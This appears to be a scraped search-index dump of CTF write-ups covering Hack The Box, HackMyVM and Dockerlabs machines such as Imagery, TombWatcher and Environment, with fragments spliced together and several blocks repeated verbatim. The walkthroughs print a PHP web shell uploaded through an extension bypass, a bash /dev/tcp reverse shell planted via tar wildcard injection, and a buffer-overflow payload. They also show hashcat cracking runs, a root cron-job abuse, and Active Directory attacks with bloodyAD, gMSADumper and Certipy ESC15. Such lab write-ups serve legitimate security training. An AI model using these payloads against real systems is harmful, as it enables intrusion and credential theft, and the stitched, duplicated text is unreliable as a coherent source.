allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups. There is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\nOne of these commands is particularly useful: it can create cron jobs. Since we can run this program as root, we create a cron job that copies the Root Flag to a file called pwned.txt in /tmp and sets permissions so we can finally read the flag.\nauto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;cp /root/root.txt /tmp/pwned.txt \u0026amp;\u0026amp; chmod 777 /tmp/pwned.txt\u0026#34; --name \u0026#34;pwned\u0026#34; Machine completed!!\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups. There is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\nOne of these commands is particularly useful: it can create cron jobs. Since we can run this program as root, we create a cron job that copies the Root Flag to a file called pwned.txt in /tmp and sets permissions so we can finally read the flag.\nauto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;cp /root/root.txt /tmp/pwned.txt \u0026amp;\u0026amp; chmod 777 /tmp/pwned.txt\u0026#34; --name \u0026#34;pwned\u0026#34; Machine completed!!\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of 